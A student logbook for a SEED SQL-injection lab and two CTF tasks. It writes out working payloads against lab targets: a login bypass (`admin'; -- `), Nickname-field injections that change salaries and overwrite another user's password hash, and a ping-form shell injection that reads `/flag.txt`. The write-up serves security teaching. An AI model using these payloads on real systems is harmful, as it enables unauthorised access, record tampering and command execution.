# Week 8 Logbook

#### Preparation Steps

* Add the following line to `/etc/hosts`
    `10.9.0.5 www.seed-server.com`

## Task 1

```sh
[11/30/21]seed@VM:~/.../lab8$ docksh mysql-10.9.0.6
root@6e2b985ea2e6:/# mysql -u root -pdees
[...]
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.22 MySQL Community Server - GPL
[...]
mysql> use sqllab_users;
[...]
Database changed
mysql> SELECT * FROM credential WHERE name="Alice";
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
1 row in set (0.00 sec)
mysql> 
```

## Task 2
### Task 2.1

* Username: `admin'; -- `
* Password: (empty)

Resulting SQL statement:
```sql
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'admin'; -- and Password=''
```

**Website Screenshot**

![Task 2.1 Screenshot](https://i.imgur.com/M4SIWoB.png)

### Task 2.2

```sh
curl 'www.seed-server.com/unsafe_home.php?username=admin%27;%20--%20&Password='
```

### Task 2.3

A special flag is required for MySQL to accept queries with multiple SQL statements.

> The API functions mysqli::query and mysqli::real_query do not set a connection flag necessary for activating multi queries in the server. An extra API call is used for multiple statements to reduce the damage of accidental SQL injection attacks. An attacker may try to add statements such as ; DROP DATABASE mysql or ; SELECT SLEEP(999). If the attacker succeeds in adding SQL to the statement string but mysqli::multi_query is not used, the server will not execute the injected and malicious SQL statement.

**Sources**
* https://dev.mysql.com/doc/apis-php/en/apis-php-mysqli.quickstart.multiple-statement.html
* https://dev.mysql.com/doc/c-api/5.7/en/c-api-multiple-queries.html

## Task 3
### Task 3.1

We wrote `Alice', salary=1000000 WHERE name="Alice"; -- ` in the **Nickname** field, and all other fields were left empty.

The resulting SQL query is:
```sql
UPDATE credential SET nickname='Alice', salary=1000000 WHERE name="Alice"; -- , email='', address='', Password='', PhoneNumber='' WHERE ID=$id;
```

### Task 3.2

Write `', salary=1 WHERE name="Boby"; -- ` in the **Nickname** field, all other fields are left empty.

**Website Screenshot**

![Task 3.2 Screenshot](https://i.imgur.com/TZWoUPb.png)

### Task 3.3


The SHA1 hash of the string `alice-was-here` is `835247a232a37bacf18189b69430984c76752cca`.

We used Alice's edit form, and wrote `',password='835247a232a37bacf18189b69430984c76752cca' WHERE name="Boby"; -- ` in the nickname field, and left all other fields empty.

We managed to log in to Boby's account using the new password.

![Task 3.3 Screenshot](https://i.imgur.com/1LEPJeb.png)

## CTF - Task 1

### Tasks

* Is there a vulnerability that lets you bypass login without knowing user credentials?
    * SQL Injection.
* Analyze the source code and try to identify if the mentioned vulnerability exists.
    * The SQL query for the login is built directly from the username and password provided by the user (instead of using a prepared statement).
* Identify the lines where the vulnerability is present.
    * Lines 40-42.
* Explore the vulnerability and login as `admin`.
    * Use the string `admin'; -- ` as username and enter an arbitrary value in the password field.

## CTF - Task 2

### Tasks

* What functionalities are available to an unauthenticated user?
    * An unauthenticated user can perform a 'speedtest' and can specify a hostname to ping.
* From the usage of those functionalities, how do you think they are implemented? Are they using any Linux utils?
    * The 'speedtest' appears to simply redirect the user to a predefined static page.
    * When pinging a hostname, the output is exactly the same as the one given by the `ping` command, so the website is probably passing user input to the `ping` command, running it in a shell and sending the output back to the user.
* In that case, what vulnerabilities could be present when calling that Linux util?
    * A shell injection vulnerability could be present if the user input isn't being properly handled.
* Is there any vulnerability in this functionality?
    * There is a shell injection vulnerability, as confirmed by inputting: `127.0.0.1; echo "Hello World";` in the *host* field. The `Hello World` message is printed, which means the `echo` command executed successfully.
* How can you exploit this vulnerability to obtain the flag, which is present in the `/flag.txt` file?
    * Using `127.0.0.1; cat /flag.txt;` as the input for the *host* field prints the contents of the `flag.txt` file.
